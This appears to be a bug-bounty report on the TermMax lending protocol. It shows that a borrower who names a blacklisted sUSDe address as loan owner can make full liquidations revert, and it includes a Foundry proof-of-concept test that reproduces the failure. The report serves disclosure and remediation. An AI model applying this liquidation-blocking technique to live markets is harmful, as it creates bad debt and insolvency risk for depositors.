## Title
Blacklisted sUSDe recipients can block liquidation, leading to potential protocol insolvency

## Brief/Intro
The protocol integrates sUSDe as a collateral asset in certain markets. 

However, sUSDe implements a blacklist mechanism that prevents blacklisted addresses from sending or receiving tokens.

A malicious borrower can exploit this behavior by setting a blacklisted address as the loan owner (collateral recipient). During liquidation, the protocol attempts to return remaining collateral to the loan owner. If the recipient is blacklisted, the transfer will revert, causing the entire liquidation transaction to fail.

This creates a Denial-of-Service (DoS) condition on liquidation, which can prevent timely liquidations and expose the protocol to insolvency risk.


## Vulnerability Details

### Blacklist Mechanism in sUSDe

The sUSDe token includes a blacklist feature that restricts token transfers for certain addresses:

https://etherscan.io/address/0x9D39A5DE30e57443BfF2A8307A4256c8797A3497#code

```solidity
contract StakedUSDe is SingleAdminAccessControl, ReentrancyGuard, ERC20Permit, ERC4626, IStakedUSDe {
  using SafeERC20 for IERC20;
...
  /**
   * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to blacklist addresses.
   * @param target The address to blacklist.
   * @param isFullBlacklisting Soft or full blacklisting level.
   */
  function addToBlacklist(address target, bool isFullBlacklisting)
    external
    onlyRole(BLACKLIST_MANAGER_ROLE)
    notOwner(target)
  {
    bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
    _grantRole(role, target);
  }

  /**
   * @notice Allows the owner (DEFAULT_ADMIN_ROLE) and blacklist managers to un-blacklist addresses.
   * @param target The address to un-blacklist.
   * @param isFullBlacklisting Soft or full blacklisting level.
   */
  function removeFromBlacklist(address target, bool isFullBlacklisting) external onlyRole(BLACKLIST_MANAGER_ROLE) {
    bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
    _revokeRole(role, target);
  }
...
```
Blacklisted addresses are unable to send or receive sUSDe tokens, which directly impacts protocol interactions involving token transfers.


### Liquidation Flow Assumption
During full liquidation, the protocol attempts to return any remaining collateral to the loan owner:
```solidity
File: AbstractGearingTokenV2.sol
529:     function liquidate(uint256 id, uint128 repayAmt, bool byDebtToken) external virtual override nonReentrant {
...
559:         if (repayAmt == loan.debtAmt) {
560:             if (remainningC.length > 0) {
561:                 _transferCollateral(ownerOf(id), remainningC);     // @audit: In this case, if ownerOf(id) is banned address, the liquidation process is reverted.
562:             }
563:             // update storage
564:             _burnInternal(id);
565:         } else {
566:             loan.debtAmt -= repayAmt;
567:             loan.collateralData = remainningC;
568:             // update storage
569:             loanMapping[id] = loan;
570:         }
571:         // Transfer collateral
572:         if (cToTreasurer.length > 0) {
573:             _transferCollateral(config.treasurer, cToTreasurer);
574:         }
575:         _transferCollateral(msg.sender, cToLiquidator);
576: 
577:         emit Liquidate(id, msg.sender, repayAmt, byDebtToken, cToLiquidator, cToTreasurer, remainningC);
578:     }
```
This logic assumes that the loan owner can always receive collateral, which is not true for blacklisted sUSDe addresses.

### Loan Ownership Can Be Arbitrarily Assigned
When a loan is created, the borrower can specify an arbitrary recipient:
```solidity
File: TermMaxMarketV2.sol
290:     function issueFt(address recipient, uint128 debt, bytes calldata collateralData)
291:         external
292:         virtual
293:         override
294:         nonReentrant
295:         isOpen
296:         returns (uint256 gtId, uint128 ftOutAmt)
297:     {
298:         return _issueFt(msg.sender, recipient, debt, collateralData);
299:     }
300: 
301:     function _issueFt(address caller, address recipient, uint128 debt, bytes calldata collateralData)
302:         internal
303:         returns (uint256 gtId, uint128 ftOutAmt)
304:     {
305:         // Mint GT
306:         gtId = gt.mint(caller, recipient, debt, collateralData);
307: 
308:         MarketConfig memory mConfig = _config;
309:         uint128 issueFee = debt.mulDiv(mintGtFeeRatio(), Constants.DECIMAL_BASE).toUint128();
310:         // Mint ft amount = debt amount, send issueFee to treasurer and other to caller
311:         ft.mint(mConfig.treasurer, issueFee);
312:         ftOutAmt = debt - issueFee;
313:         ft.mint(recipient, ftOutAmt);
314: 
315:         emit IssueFt(caller, recipient, gtId, debt, ftOutAmt, issueFee, collateralData);
316:     }
```
This recipient becomes the owner of the loan (GT NFT):

```solidity
File: AbstractGearingTokenV2.sol
166:     function mint(address collateralProvider, address to, uint128 debtAmt, bytes memory collateralData)
167:         external
168:         virtual
169:         override
170:         nonReentrant
171:         onlyOwner
172:         returns (uint256 id)
173:     {
174:         _checkBeforeMint(debtAmt, collateralData);
175:         _transferCollateralFrom(collateralProvider, address(this), collateralData);
176:         id = _mintInternal(to, debtAmt, collateralData, _config);
177:     }
178: 
179:     /// @notice Check if the loan can be minted
180:     function _checkBeforeMint(uint128 debtAmt, bytes memory collateralData) internal virtual;
181: 
182:     function _mintInternal(address to, uint128 debtAmt, bytes memory collateralData, GtConfig memory config)
183:         internal
184:         returns (uint256 id)
185:     {
186:         LoanInfo memory loan = LoanInfo(debtAmt, collateralData);
187:         ValueAndPrice memory valueAndPrice = _getValueAndPrice(config, loan);
188:         uint128 ltv = _calculateLtv(valueAndPrice);
189:         if (ltv > config.loanConfig.maxLtv) {
190:             revert GtIsNotHealthy(0, to, ltv);
191:         }
192:         id = ++totalIds;
193:         loanMapping[id] = loan;
194:         _safeMint(to, id);
195:     }
```
There are no validations ensuring that the recipient is capable of receiving the collateral token.

### Exploit Scenario
Attacker selects (or controls) a blacklisted address.
Attacker opens a position using this address as the loan owner.
The loan becomes undercollateralized due to market movement.
A liquidator attempts to fully liquidate the position.
The protocol tries to return remaining sUSDe collateral to the blacklisted address.
The transfer reverts, causing the entire liquidation transaction to fail.

### Root Cause

The protocol assumes that:

“Collateral transfers to the loan owner will always succeed.”

This assumption is invalid when using tokens with transfer restrictions, such as blacklist-enabled tokens like sUSDe.

## Impact Details
High Severity — Protocol Insolvency Risk
Liquidation DoS: Full liquidation becomes impossible for affected positions.
Delayed Liquidations: Only partial liquidations may succeed, reducing liquidation efficiency.
Bad Debt Accumulation: If collateral value drops rapidly, positions may become undercollateralized beyond recovery.
Protocol Insolvency: In extreme scenarios, the protocol may be unable to recover sufficient value from collateral, leading to systemic losses.


## References
https://github.com/term-structure/termmax-contract-v2/blob/2adc9c617fbddf28bf32e23128adc0c4ea3f28c0/contracts/v2/tokens/AbstractGearingTokenV2.sol#L561


## Proof of Concept
This is unit test code.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {DeployUtils} from "./utils/DeployUtils.sol";
import {JSONLoader} from "./utils/JSONLoader.sol";
import {StateChecker} from "./utils/StateChecker.sol";
import {SwapUtils} from "./utils/SwapUtils.sol";
import {LoanUtils} from "./utils/LoanUtils.sol";

import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Constants} from "contracts/v1/lib/Constants.sol";
import {
    ITermMaxMarketV2, TermMaxMarketV2, Constants, MarketErrors, MarketEvents
} from "contracts/v2/TermMaxMarketV2.sol";
import {MockERC20, ERC20} from "contracts/v1/test/MockERC20.sol";

import {MockPriceFeed} from "contracts/v1/test/MockPriceFeed.sol";
import {IMintableERC20} from "contracts/v1/tokens/MintableERC20.sol";
import {IGearingToken} from "contracts/v1/tokens/IGearingToken.sol";
import {
    GearingTokenWithERC20V2,
    GearingTokenEvents,
    GearingTokenErrors,
    GearingTokenErrorsV2,
    GearingTokenEventsV2,
    GtConfig
} from "contracts/v2/tokens/GearingTokenWithERC20V2.sol";
import {
    ITermMaxFactory,
    TermMaxFactoryV2,
    FactoryErrors,
    FactoryEvents,
    FactoryEventsV2
} from "contracts/v2/factory/TermMaxFactoryV2.sol";
import {IOracleV2, OracleAggregatorV2, AggregatorV3Interface} from "contracts/v2/oracle/OracleAggregatorV2.sol";
import {IOracle} from "contracts/v1/oracle/IOracle.sol";
import {
    VaultInitialParams,
    MarketConfig,
    MarketInitialParams,
    LoanConfig,
    OrderConfig,
    CurveCuts
} from "contracts/v1/storage/TermMaxStorage.sol";
import {MockFlashLoanReceiver} from "contracts/v1/test/MockFlashLoanReceiver.sol";
import {MockFlashRepayerV2} from "contracts/v2/test/MockFlashRepayerV2.sol";
import {ISwapCallback} from "contracts/v1/ISwapCallback.sol";
import {TermMaxOrderV2, OrderInitialParams} from "contracts/v2/TermMaxOrderV2.sol";

import {ITermMaxMarket, ITermMaxMarketV2, TermMaxMarketV2} from "contracts/v2/TermMaxMarketV2.sol";
import {ITermMaxOrder, ISwapCallback, TermMaxOrderV2} from "contracts/v2/TermMaxOrderV2.sol";
import {MockERC20, ERC20} from "contracts/v1/test/MockERC20.sol";
import {MockERC20Blacklist} from "contracts/v1/test/MockERC20Blacklist.sol";
import {MockPriceFeed} from "contracts/v1/test/MockPriceFeed.sol";
import {IMintableERC20} from "contracts/v1/tokens/IMintableERC20.sol";
import {IMintableERC20V2, MintableERC20V2} from "contracts/v2/tokens/MintableERC20V2.sol";
import {IGearingToken} from "contracts/v1/tokens/IGearingToken.sol";
import {ITermMaxFactory, TermMaxFactoryV2} from "contracts/v2/factory/TermMaxFactoryV2.sol";
import {TermMaxRouterV2} from "contracts/v2/router/TermMaxRouterV2.sol";
import {IOracleV2, OracleAggregatorV2, AggregatorV3Interface} from "contracts/v2/oracle/OracleAggregatorV2.sol";
import {IOracle} from "contracts/v1/oracle/IOracle.sol";
import {MockOrderV2} from "contracts/v2/test/MockOrderV2.sol";
import {VaultFactory, IVaultFactory} from "contracts/v1/factory/VaultFactory.sol";
import {OrderManagerV2} from "contracts/v2/vault/OrderManagerV2.sol";
import {TermMaxVaultV2} from "contracts/v2/vault/TermMaxVaultV2.sol";
import {AccessManager} from "contracts/v2/access/AccessManagerV2.sol";
import {
    VaultInitialParams,
    MarketConfig,
    MarketInitialParams,
    LoanConfig,
    OrderConfig,
    CurveCut,
    CurveCuts
} from "contracts/v1/storage/TermMaxStorage.sol";
import {VaultInitialParamsV2} from "contracts/v2/storage/TermMaxStorageV2.sol";
import {TermMaxVaultFactoryV2} from "contracts/v2/factory/TermMaxVaultFactoryV2.sol";
import {MockAave} from "contracts/v2/test/MockAave.sol";
import {WhitelistManager, IWhitelistManager} from "contracts/v2/access/WhitelistManager.sol";

contract GtTestV2 is Test {
    using JSONLoader for *;
    using SafeCast for uint256;
    using SafeCast for int256;


    struct Res {
        TermMaxVaultV2 vault;
        IVaultFactory vaultFactory;
        TermMaxFactoryV2 factory;
        TermMaxOrderV2 order;
        TermMaxRouterV2 router;
        MarketConfig marketConfig;
        OrderConfig orderConfig;
        TermMaxMarketV2 market;
        IMintableERC20 ft;
        IMintableERC20 xt;
        IGearingToken gt;
        MockPriceFeed debtOracle;
        MockPriceFeed collateralOracle;
        OracleAggregatorV2 oracle;
        MockERC20Blacklist collateral;
        MockERC20 debt;
    }

    Res res;

    OrderConfig orderConfig;
    MarketConfig marketConfig;

    address deployer = vm.randomAddress();
    address sender = vm.randomAddress();
    address treasurer = vm.randomAddress();
    address maker = vm.randomAddress();
    address blacklisted = vm.randomAddress();
    string testdata;

    MockFlashLoanReceiver flashLoanReceiver;

    MockFlashRepayerV2 flashRepayer;

    uint32 maxLtv = 0.89e8;
    uint32 liquidationLtv = 0.9e8;
    
    bytes32 constant GT_ERC20 = keccak256("GearingTokenWithERC20");

    function deployFactory(address admin) public returns (TermMaxFactoryV2 factory) {
        address tokenImplementation = address(new MintableERC20V2());
        address orderImplementation = address(new TermMaxOrderV2());
        TermMaxMarketV2 m = new TermMaxMarketV2(tokenImplementation, orderImplementation);
        factory = new TermMaxFactoryV2(admin, address(m));
    }

    function deployFactoryWithMockOrder(address admin) public returns (TermMaxFactoryV2 factory) {
        address tokenImplementation = address(new MintableERC20V2());
        address orderImplementation = address(new MockOrderV2());
        TermMaxMarketV2 m = new TermMaxMarketV2(tokenImplementation, orderImplementation);
        factory = new TermMaxFactoryV2(admin, address(m));
    }

    function deployOracle(address admin, uint256 timeLock) public returns (OracleAggregatorV2 oracle) {
        oracle = new OracleAggregatorV2(admin, timeLock);
    }

    function deployMarket(address admin, MarketConfig memory marketConfig, uint32 maxLtv, uint32 liquidationLtv)
        internal
        returns (Res memory res)
    {
        res.factory = deployFactory(admin);

        res.collateral = new MockERC20Blacklist("sUSDe", "sUSDe", 18, blacklisted);
        res.debt = new MockERC20("DAI", "DAI", 8);

        res.debtOracle = new MockPriceFeed(admin);
        res.collateralOracle = new MockPriceFeed(admin);
        res.oracle = deployOracle(admin, 0);

        res.oracle.submitPendingOracle(
            address(res.debt), IOracleV2.Oracle(res.debtOracle, res.debtOracle, 0, 0, 365 days, 0)
        );
        res.oracle.submitPendingOracle(
            address(res.collateral), IOracleV2.Oracle(res.collateralOracle, res.collateralOracle, 0, 0, 365 days, 0)
        );

        res.oracle.acceptPendingOracle(address(res.debt));
        res.oracle.acceptPendingOracle(address(res.collateral));

        MockPriceFeed.RoundData memory roundData = MockPriceFeed.RoundData({
            roundId: 1,
            answer: int256(1e1 ** res.collateralOracle.decimals()),
            startedAt: 0,
            updatedAt: 0,
            answeredInRound: 0
        });
        res.collateralOracle.updateRoundData(roundData);

        MarketInitialParams memory initialParams = MarketInitialParams({
            collateral: address(res.collateral),
            debtToken: res.debt,
            admin: admin,
            gtImplementation: address(0),
            marketConfig: marketConfig,
            loanConfig: LoanConfig({
                oracle: IOracle(address(res.oracle)),
                liquidationLtv: liquidationLtv,
                maxLtv: maxLtv,
                liquidatable: true
            }),
            gtInitalParams: abi.encode(type(uint256).max),
            tokenName: "DAI-ETH",
            tokenSymbol: "DAI-ETH"
        });

        res.marketConfig = marketConfig;
        res.market = TermMaxMarketV2(res.factory.createMarket(GT_ERC20, initialParams, 0));

        (res.ft, res.xt, res.gt,,) = res.market.tokens();
    }

    function setUp() public {
        vm.startPrank(deployer);
        testdata = vm.readFile(string.concat(vm.projectRoot(), "/test/testdata/testdata.json"));

        marketConfig = JSONLoader.getMarketConfigFromJson(treasurer, testdata, ".marketConfig");
        orderConfig = JSONLoader.getOrderConfigFromJson(testdata, ".orderConfig");
        orderConfig.maxXtReserve = type(uint128).max;
        res = deployMarket(deployer, marketConfig, maxLtv, liquidationLtv);

        res.order = TermMaxOrderV2(
            address(
                res.market.createOrder(
                    maker, orderConfig.maxXtReserve, ISwapCallback(address(0)), orderConfig.curveCuts
                )
            )
        );

        OrderInitialParams memory orderParams;
        orderParams.maker = maker;
        orderParams.orderConfig = orderConfig;
        uint256 amount = 15000e8;
        orderParams.virtualXtReserve = amount;
        res.order = TermMaxOrderV2(address(res.market.createOrder(orderParams)));

        vm.warp(vm.parseUint(vm.parseJsonString(testdata, ".currentTime")));

        // update oracle
        res.collateralOracle.updateRoundData(JSONLoader.getRoundDataFromJson(testdata, ".priceData.ETH_2000_DAI_1.eth"));
        res.debtOracle.updateRoundData(JSONLoader.getRoundDataFromJson(testdata, ".priceData.ETH_2000_DAI_1.dai"));

        res.debt.mint(deployer, amount);
        res.debt.approve(address(res.market), amount);
        res.market.mint(deployer, amount);
        res.ft.transfer(address(res.order), amount);
        res.xt.transfer(address(res.order), amount);

        flashLoanReceiver = new MockFlashLoanReceiver(res.market);
        flashRepayer = new MockFlashRepayerV2(res.gt);

        vm.stopPrank();
    }

    // Can't liquidate because of blacklisting.
    function testLiquidateBlacklist() public {
        uint128 debtAmt = 1000e8;
        uint256 collateralAmt = 1e18;

        vm.startPrank(sender);

        res.collateral.mint(sender, collateralAmt);
        res.collateral.approve(address(res.gt), collateralAmt);
        bytes memory collateralData = abi.encode(collateralAmt);

        //
        // @audit: This loan's owner is 'blacklisted' address of 'sUSDe' token.
        //
        (uint gtId,) = res.market.issueFt(blacklisted, debtAmt, collateralData);

        vm.stopPrank();
        vm.startPrank(deployer);
        // update oracle
        MockPriceFeed.RoundData memory priceData = JSONLoader.getRoundDataFromJson(testdata, ".priceData.ETH_1000_DAI_1.eth");
        priceData.answer = 110500000000;    // @audit: In this case, ltv will be 90+%.
        res.collateralOracle.updateRoundData(priceData);
        res.debtOracle.updateRoundData(JSONLoader.getRoundDataFromJson(testdata, ".priceData.ETH_1000_DAI_1.dai"));
        vm.stopPrank();

        address liquidator = vm.randomAddress();
        vm.startPrank(liquidator);

        res.debt.mint(liquidator, debtAmt);
        res.debt.approve(address(res.gt), debtAmt);

        (bool isLiquidable, uint128 ltv, uint128 maxRepayAmt) = res.gt.getLiquidationInfo(gtId);
        assert(ltv > 90_000_000);
        emit log_named_uint("ltv", ltv);

        //
        // @audit: Trying to liquidate total debt but it fails because remaining collateral can't be sent back to loan owner.
        //
        vm.expectRevert();
        res.gt.liquidate(gtId, debtAmt, true);

        vm.stopPrank();
    }

}
```

To run this test code, please run
```shell
forge test --match-test testLiquidateBlacklist
```